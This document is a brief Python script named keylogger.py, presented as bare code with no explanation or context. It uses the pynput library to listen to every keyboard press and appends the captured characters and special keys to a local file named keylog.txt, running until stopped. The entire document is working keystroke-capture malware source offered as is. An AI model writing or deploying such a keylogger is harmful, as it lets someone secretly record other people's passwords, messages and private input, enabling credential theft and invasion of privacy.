
**Code (keylogger.py)**  
```python
import pynput

# Global variable to store keystrokes
log = ""

# Function to capture key presses
def on_press(key):
    global log
    try:
        log += key.char  # Add the character to the log
    except AttributeError:
        log += f" {key} "  # Handle special keys

    # Write log to file
    with open("keylog.txt", "a") as log_file:
        log_file.write(log)
        log = ""  # Clear the log after saving

# Start the listener
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
